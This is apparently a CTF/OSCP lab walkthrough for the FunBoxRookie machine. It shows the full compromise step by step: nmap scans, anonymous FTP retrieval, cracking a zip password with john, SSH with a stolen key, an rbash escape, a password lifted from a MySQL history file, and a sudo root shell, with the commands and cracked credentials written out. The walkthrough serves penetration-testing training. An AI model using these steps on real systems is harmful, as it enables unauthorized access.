---
title : "FunBoxRookie- Walkthrough"
date : 21-10-2024 03:00:00
tags : [Offsec-Play, OSCP]
---


## Summary

This machine is exploited with an anonymous FTP server containing file **id_rsa** and then the disclosure of user credentials in a history file. It is escalated via open sudo that allows the user to run any command with elevated privileges.

## Enumeration

### Nmap

We start off by running an `nmap` scan:

```bash
kali@kali:~$ sudo nmap 192.168.120.138
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 13:07 EDT
Nmap scan report for 192.168.120.138
Host is up (0.032s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

We can run a more detailed `nmap` scan with the `-sC` flag against the discovered ports:

```bash
kali@kali:~$ sudo nmap -p 21,22,80 192.168.120.138 -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 13:09 EDT
Nmap scan report for 192.168.120.138
Host is up (0.030s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:50 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:52 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:58 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:50 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:50 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25 10:44 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 zlatan.zip
22/tcp open  ssh
| ssh-hostkey: 
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
80/tcp open  http
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-title: Apache2 Ubuntu Default Page: It works
```

The FTP server listening on the default port allows for anonymous logins, and we see several zip files listed.

## Exploitation

### Anonymous FTP Server

Of the files shown in the scan, only file **tom.zip** will prove useful to us. Next, we can log in and retrieve it:

```bash
kali@kali:~$ ftp 192.168.120.138
Connected to 192.168.120.138.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.120.138]
Name (192.168.120.138:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.118.3 !
230-
230-The local time is: Wed Oct 14 17:11:13 2020
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get tom.zip
local: tom.zip remote: tom.zip
200 PORT command successful
150 Opening BINARY mode data connection for tom.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (28.1715 MB/s)
ftp> bye
221 Goodbye.
kali@kali:~$ 
```

However, if we try to open the archive, we will find that it is password-protected.

### Password Bruteforce

We can use `zip2john` to convert the encrypted archive to a hash file usable by `john`:

```bash
kali@kali:~$ zip2john tom.zip > tom.hash
ver 2.0 efh 5455 efh 7875 tom.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6
kali@kali:~$
```

We can now use `john` and the **rockyou.txt** wordlist to crack the password:

```bash
kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt tom.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iubire           (tom.zip/id_rsa)
1g 0:00:00:00 DONE (2020-10-14 13:17) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~$
```

The cracker succeeds and reveals that the password is `iubire`. Using it, we can unlock the archive:

```bash
kali@kali:~$ unzip -P iubire tom.zip
Archive:  tom.zip
  inflating: id_rsa

kali@kali:~$
```

We have obtained a private SSH key file **id_rsa**.

### SSH

Since we have obtained the private key from the archive **tom.zip**, we can assume that the user is named `tom`. Next, we will set proper key file permissions and then SSH to the target:

```bash
kali@kali:~$ chmod 0600 id_rsa
kali@kali:~$
kali@kali:~$ ssh -o StrictHostKeyChecking=no -i id_rsa tom@192.168.120.138
...
tom@funbox2:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
tom@funbox2:~$
```

### Escaping Restricted Shell

But, if try to change directory or any of the other restricted commands, we will find that our default shell upon login is `rbash`, which we must first escape:

```bash
tom@funbox2:~$ pwd
/home/tom
tom@funbox2:~$ cd ..
-rbash: cd: restricted
tom@funbox2:~$
```

There are many ways to do so, and we will choose one of the easiest ones (exiting the current shell and then reconnecting with the flag `-t "bash --noprofile"`):

```bash
tom@funbox2:~$ exit
logout
-rbash: /usr/bin/clear_console: restricted: cannot specify `/' in command names
Connection to 192.168.120.138 closed.
kali@kali:~$
kali@kali:~$ ssh -o StrictHostKeyChecking=no -i id_rsa tom@192.168.120.138 -t "bash --noprofile"
load pubkey "id_rsa": invalid format
tom@funbox2:~$ pwd
/home/tom
tom@funbox2:~$ cd ..
tom@funbox2:/home$
```

We are now able to traverse and enumerate the system further.

## Escalation

### User Password Recovery

Looking around the user's home directory, we find a MySQL history file:

```bash
tom@funbox2:/home$ cd ~
tom@funbox2:~$ ls -la
...
-rw------- 1 tom  tom   295 Jul 25 12:04 .mysql_history
...
tom@funbox2:~$
```

In this file, we see the history of several MySQL commands:

```bash
tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
tom@funbox2:~$
```

The command `insert\040into\040support\040(tom,\040xx11yy22!);` looks very interesting as it contains string `xx11yy22!` that looks like a password.

### Sudo Escalation

Trying the password for the user to enumerate sudo privileges works, and we see that user `tom` is actually able to run any command with sudo, providing the password:

```bash
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
tom@funbox2:~$
```

We can easily use this to get a root shell:

```bash
tom@funbox2:~$ sudo su
root@funbox2:/home/tom# id
uid=0(root) gid=0(root) groups=0(root)
root@funbox2:/home/tom#
```
